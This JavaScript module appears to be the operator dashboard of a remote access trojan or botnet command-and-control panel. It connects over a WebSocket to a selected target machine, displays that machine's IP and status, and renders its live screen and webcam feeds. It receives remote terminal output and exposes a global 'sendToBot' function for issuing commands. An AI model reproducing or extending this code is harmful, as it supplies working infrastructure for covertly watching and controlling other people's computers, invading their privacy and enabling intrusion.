import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const decoder = new TextDecoder();

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val ?? '...';
};

const setOnline = (isOnline) => {
    document.getElementById('status-indicator')?.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    if (!pkg) return;

    if (pkg.module === 'DataScribe') {
        try {
            const raw = JSON.parse(decoder.decode(pkg.payload));
            const data = Array.isArray(raw) 
                ? raw.find(c => c.id === AppState.clientId) 
                : (raw[AppState.clientId] || raw);

            if (data) {
                if (data.ip) updateUI('display-ip', data.ip);
                if (data.id) updateUI('display-id', data.id);
                setOnline(data.status === 'online' || !!data.id);
            }
        } catch (e) { console.error("[WS] DataScribe Error", e); }
    } 
    else if (pkg.module === 'ScreenWatch') {
        if (pkg.payload.byteLength > 200) renderScreenRGBA(pkg.payload);
    }
    else if (pkg.module === 'Webcam') {
        window.renderWebcam?.(pkg.payload);
    }
        else if (pkg.module === 'Terminal') {
            try {
                const json = JSON.parse(decoder.decode(pkg.payload));
                // Передаем весь объект json в detail
                window.dispatchEvent(new CustomEvent('terminalOutput', { detail: json }));
            } catch(e) { console.error("[WS] Terminal Error", e); }
        }
    else {
        window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

export function initControlConnection() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');
    const targetId = AppState.clientId;

    if (!token || !login || !targetId) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(targetId)}`;

    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';

    socket.onmessage = (e) => handleIncomingData(e.data);
    socket.onclose = () => setOnline(false);
    socket.onopen = () => console.log(`🚀 [WS] Connected to control stream for: ${targetId}`);

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) socket.send(encodePacket(targetId, mod, pay));
    };
}